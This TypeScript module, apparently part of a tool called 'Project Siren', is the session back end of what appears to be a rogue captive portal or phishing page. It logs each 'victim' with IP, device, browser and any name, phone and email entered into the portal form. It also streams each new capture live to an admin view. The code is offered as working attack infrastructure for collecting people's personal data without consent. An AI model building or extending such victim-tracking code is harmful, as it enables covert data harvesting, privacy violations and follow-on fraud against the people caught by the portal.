/**
 * PROJECT SIREN - Session Management
 * Tracks victims and provides statistics
 */

export interface Victim {
    id: number;
    userAgent: string;
    ip: string;
    timestamp: string;
    device: 'iOS' | 'Android' | 'Desktop' | 'Unknown';
    browser: string;
    // Portal form data (optional)
    name?: string;
    phone?: string;
    email?: string;
}

export interface SessionStats {
    count: number;
    victims: Victim[];
    deviceBreakdown: {
        iOS: number;
        Android: number;
        Desktop: number;
        Unknown: number;
    };
    currentVictim?: Victim; // Most recent victim for admin display
}

// In-memory storage (resets on server restart)
const sessions: SessionStats = {
    count: 0,
    victims: [],
    deviceBreakdown: {
        iOS: 0,
        Android: 0,
        Desktop: 0,
        Unknown: 0,
    },
    currentVictim: undefined,
};

/**
 * Parse device type from User-Agent string
 */
export function parseDevice(userAgent: string): Victim['device'] {
    const ua = userAgent.toLowerCase();

    if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('ipod')) {
        return 'iOS';
    }
    if (ua.includes('android')) {
        return 'Android';
    }
    if (ua.includes('windows') || ua.includes('macintosh') || ua.includes('linux')) {
        if (!ua.includes('mobile')) {
            return 'Desktop';
        }
    }
    return 'Unknown';
}

/**
 * Parse browser from User-Agent string
 */
export function parseBrowser(userAgent: string): string {
    const ua = userAgent.toLowerCase();

    if (ua.includes('chrome') && !ua.includes('edg')) return 'Chrome';
    if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
    if (ua.includes('firefox')) return 'Firefox';
    if (ua.includes('edg')) return 'Edge';
    if (ua.includes('opera') || ua.includes('opr')) return 'Opera';
    return 'Other';
}

/**
 * Add a new victim to the session
 * Now includes optional portal form data
 */
export function addVictim(
    userAgent: string,
    ip: string,
    formData?: { name?: string; phone?: string; email?: string }
): Victim {
    const device = parseDevice(userAgent);
    const browser = parseBrowser(userAgent);

    const victim: Victim = {
        id: ++sessions.count,
        userAgent,
        ip: ip || 'Unknown',
        timestamp: new Date().toISOString(),
        device,
        browser,
        name: formData?.name || undefined,
        phone: formData?.phone || undefined,
        email: formData?.email || undefined,
    };

    sessions.victims.push(victim);
    sessions.deviceBreakdown[device]++;
    sessions.currentVictim = victim; // Track as current victim

    // Keep only last 100 victims in memory
    if (sessions.victims.length > 100) {
        const removed = sessions.victims.shift();
        if (removed) {
            sessions.deviceBreakdown[removed.device]--;
        }
    }

    return victim;
}

/**
 * Get current session statistics
 */
export function getStats(): SessionStats {
    return { ...sessions };
}

/**
 * Get recent victims (last n)
 */
export function getRecentVictims(count: number = 10): Victim[] {
    return sessions.victims.slice(-count).reverse();
}

/**
 * Reset all sessions (for testing)
 */
export function resetSessions(): void {
    sessions.count = 0;
    sessions.victims = [];
    sessions.deviceBreakdown = {
        iOS: 0,
        Android: 0,
        Desktop: 0,
        Unknown: 0,
    };
}

// ============================================
// SSE (Server-Sent Events) Client Management
// Moved here to avoid route import anti-pattern
// ============================================

const clients: Set<ReadableStreamDefaultController> = new Set();

export function addClient(controller: ReadableStreamDefaultController): void {
    clients.add(controller);
}

export function removeClient(controller: ReadableStreamDefaultController): void {
    clients.delete(controller);
}

export function notifyClients(victim: Victim): void {
    const data = JSON.stringify(victim);
    const message = `data: ${data}\n\n`;

    clients.forEach((controller) => {
        try {
            controller.enqueue(new TextEncoder().encode(message));
        } catch {
            // Client disconnected, remove from set
            clients.delete(controller);
        }
    });
}
